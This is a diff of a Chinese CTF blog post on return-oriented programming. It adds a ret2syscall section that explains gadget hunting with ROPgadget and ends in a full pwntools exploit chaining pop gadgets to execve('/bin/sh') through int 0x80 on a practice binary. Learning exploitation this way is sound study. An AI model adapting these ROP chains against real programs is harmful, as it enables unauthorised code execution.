@@ -24,8 +24,8 @@
 
   <meta name="description" content="栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程 ——CTF Wiki">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ROP">
-<meta property="og:url" content="http://example.com/2021/03/11/ROP/index.html">
+<meta property="og:title" content="基础ROP">
+<meta property="og:url" content="http://example.com/2021/03/11/%E5%9F%BA%E7%A1%80ROP/index.html">
 <meta property="og:site_name" content="HeHeのr">
 <meta property="og:description" content="栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程 ——CTF Wiki">
 <meta property="og:locale" content="zh_CN">
@@ -39,14 +39,20 @@
 <meta property="og:image" content="https://img.imgdb.cn/item/6049eb985aedab222c032ec6.jpg">
 <meta property="og:image" content="https://img.imgdb.cn/item/6049ef925aedab222c06ccf9.jpg">
 <meta property="og:image" content="https://img.imgdb.cn/item/6049f4dd5aedab222c0bf31e.jpg">
+<meta property="og:image" content="https://img.imgdb.cn/item/6049fd515aedab222c143189.jpg">
+<meta property="og:image" content="https://img.imgdb.cn/item/6049fd6f5aedab222c144ee7.jpg">
+<meta property="og:image" content="https://img.imgdb.cn/item/604a078e5aedab222c1e4e6d.jpg">
+<meta property="og:image" content="https://img.imgdb.cn/item/604a08015aedab222c1ee01f.jpg">
+<meta property="og:image" content="https://img.imgdb.cn/item/604a0a545aedab222c21918c.jpg">
+<meta property="og:image" content="https://img.imgdb.cn/item/604a0aa15aedab222c21e154.jpg">
 <meta property="article:published_time" content="2021-03-11T05:31:25.000Z">
-<meta property="article:modified_time" content="2021-03-11T10:51:55.231Z">
+<meta property="article:modified_time" content="2021-03-11T12:22:52.558Z">
 <meta property="article:author" content="些子疏狂">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img.imgdb.cn/item/6049c3645aedab222ceaecc7.png">
 
-<link rel="canonical" href="http://example.com/2021/03/11/ROP/">
+<link rel="canonical" href="http://example.com/2021/03/11/%E5%9F%BA%E7%A1%80ROP/">
 
 
 <script id="page-configurations">
@@ -59,7 +65,7 @@
   };
 </script>
 
-  <title>ROP | HeHeのr</title>
+  <title>基础ROP | HeHeのr</title>
   
 
 
@@ -172,7 +178,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/11/ROP/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/11/%E5%9F%BA%E7%A1%80ROP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar1.gif">
@@ -185,7 +191,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          ROP
+          基础ROP
         </h1>
 
         <div class="post-meta">
@@ -196,7 +202,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-03-11 13:31:25 / 修改时间：18:51:55" itemprop="dateCreated datePublished" datetime="2021-03-11T13:31:25+08:00">2021-03-11</time>
+              <time title="创建时间：2021-03-11 13:31:25 / 修改时间：20:22:52" itemprop="dateCreated datePublished" datetime="2021-03-11T13:31:25+08:00">2021-03-11</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -245,7 +251,33 @@ buf2_addr = 0x804A080
 sh.sendline(shellcode.ljust(112, &#39;a&#39;) + p32(buf2_addr))
 sh.interactive()</code></pre>
 <p>这样就能通过执行buf2上的shellcode来获取shell</p>
-<h1 id="retsyscall"><a href="#retsyscall" class="headerlink" title="retsyscall"></a>retsyscall</h1>
+<h1 id="retsyscall"><a href="#retsyscall" class="headerlink" title="retsyscall"></a>retsyscall</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>即控制程序执行系统调用，获取 shell。</p>
+<h2 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h2><p>ret2syscall<br>同样checksec和ida查看源码<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6049fd515aedab222c143189.jpg"><img src="https://img.imgdb.cn/item/6049fd515aedab222c143189.jpg"></a><br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6049fd6f5aedab222c144ee7.jpg"><img src="https://img.imgdb.cn/item/6049fd6f5aedab222c144ee7.jpg"></a><br>依旧是gets(&amp;v4)存在一个栈溢出,先前讨论过的不再赘述<br>主要关注这次我们不能利用程序中的某一段代码或者自己填写代码来获得shell，所以我们利用程序中的系统调用来获得shell</p>
+<p>维基百科上关于系统调用的知识背景说明，<br>系统调用提供用户程序与操作系统之间的接口。<br>操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限，其中系统调用运行在内核空间。<br>linux的系统调用通过int 80h实现，其中应用程序调用系统调用的过程是<br>  1、把系统调用的编号存入EAX<br>  2、把函数参数存入其他通用寄存器<br>  3、触发0x80号中断(int 0x80)</p>
+<p>简单来说，就是我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行int 0x80时就可执行对应的系统调用<br>这个程序是32位的，我们需要满足</p>
+<pre><code>系统调用号，即eax应该为0xb
+第一个参数，即ebx应该指向/bin/sh的地址
+第二个参数，即ecx应该为0
+第三个参数，即edx应该为0</code></pre>
+<p>那么我们就需要使用gadgets来控制这些寄存器的值，比如说现在栈顶的数据为10，再执行pop eax，那么现在eax就被我们控制为10<br>但是难以找到一段连续的代码直接同时控制对应的寄存器，也就是我们需要一段一段找到能够控制相应寄存器的gadgets来对其进行控制，最后使用ret来再次控制程序执行流程<br>而具体寻找gadgets的方法，CTF Wiki中给出ropgadgets的选择<br>通过 ROPgadget –binary 程序名  –only ‘pop|ret’ | grep ‘eax’获取控制eax的gadgets<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/604a078e5aedab222c1e4e6d.jpg"><img src="https://img.imgdb.cn/item/604a078e5aedab222c1e4e6d.jpg"></a><br>找到的几个都可以控制eax，选择第二个来作为gadgets<br>类似的获得控制其他寄存器的gadgets</p>
+<p>ROPgadget –binary ret2syscall  –only ‘pop|ret’ | grep ‘ebx’<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/604a08015aedab222c1ee01f.jpg"><img src="https://img.imgdb.cn/item/604a08015aedab222c1ee01f.jpg"></a><br>这里选择倒数第六行,因为这个可以直接控制其它三个寄存器</p>
+<p>此外需要获得/bin/sh字符串对应的地址<br>ROPgadget –binary ret2syscall  –string ‘/bin/sh’<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/604a0a545aedab222c21918c.jpg"><img src="https://img.imgdb.cn/item/604a0a545aedab222c21918c.jpg"></a><br>和int 0x80的地址<br>ROPgadget –binary ret2syscall  –only ‘int’<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/604a0aa15aedab222c21e154.jpg"><img src="https://img.imgdb.cn/item/604a0aa15aedab222c21e154.jpg"></a></p>
+<p>就这样我们找到了我们所需要的所有地址，就可以构造如下exp</p>
+<pre><code>from pwn import *
+sh = process(&#39;./rop&#39;)
+pop_eax_ret = 0x080bb196
+pop_edx_ecx_ebx_ret = 0x0806eb90
+int_0x80 = 0x08049421
+binsh = 0x80be408
+payload = flat([&#39;A&#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
+sh.sendline(payload)
+sh.interactive()</code></pre>
+<p>其中注释两点：</p>
+<pre><code>1、 0xb 为 execve 对应的系统调用号
+2、flat()
+    在pwntools中可以用flat()来构造rop，参数传递用list传，list中的element为想串接的rop gadget地址，
+    简单来说就是可以把：rop = p32(gadget1) + p32(gadget2) + p32(gadget3) ……变成这样表示：flat([gadget1,gadget2,gadget3,……])</code></pre>
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2>
     </div>
 
     
@@ -325,7 +357,7 @@ sh.interactive()</code></pre>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-text">ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-text">例子</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shell"><span class="nav-text">ret2shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90-1"><span class="nav-text">例子</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#retsyscall"><span class="nav-text">retsyscall</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-text">ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-text">例子</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shell"><span class="nav-text">ret2shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90-1"><span class="nav-text">例子</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#retsyscall"><span class="nav-text">retsyscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90-2"><span class="nav-text">例子</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-3"><span class="nav-text">原理</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
